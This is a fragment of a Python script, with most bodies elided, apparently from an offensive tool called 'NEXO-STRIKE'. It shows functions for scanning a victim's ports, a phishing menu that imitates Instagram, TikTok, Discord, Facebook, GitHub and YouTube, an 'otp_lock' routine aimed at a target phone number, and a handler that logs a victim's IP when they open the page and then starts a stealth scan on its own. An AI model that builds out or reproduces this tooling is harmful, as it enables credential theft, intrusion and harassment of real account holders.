...
def scan_victim_ports(victim_ip):
    ...
    # 22:SSH, 80:HTTP, 443:HTTPS, 5555:ADB, 8080:Proxy, 3306:SQL
...
def start_phish():
    ...
    s = input(f"\n{C}NEXO-STRIKE > {W}")
    sites = {
        "1":"instagram", "2":"tiktok", "3":"discord", 
        "4":"facebook", "5":"github", "6":"youtube"
    }
...
def otp_lock():
    ...
    target = input(f"{Y}[+] Target Number (070...): {W}")
...
def handle_phish(site):
    ...
    if request.method == 'GET':
        print(f"\n{R}[!] TARGET HIT DETECTED! IP: {W}{victim_ip}")
        # Auto-trigger stealth scan on click
